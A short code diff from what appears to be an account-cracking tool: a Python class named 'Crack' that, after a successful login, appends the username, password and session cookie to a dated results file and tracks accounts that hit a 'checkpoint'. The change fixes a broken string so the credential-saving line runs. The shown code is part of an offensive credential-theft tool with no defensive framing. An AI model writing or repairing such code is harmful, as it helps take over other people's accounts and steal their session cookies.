@@ -496,7 +496,7 @@ class Crack:
 					#tree.add(f"\H2}{user}|{pw}{P2} ")
 					tree.add(Panel(f"{H2}{coki}{P2}",style=f"{color_panel}"))
 					prints(tree)
-					open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{coki}\)
+					open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{coki}")
 					break
 				elif 'checkpoint' in ses.cookies.get_dict():
 					self.cp.append(user)
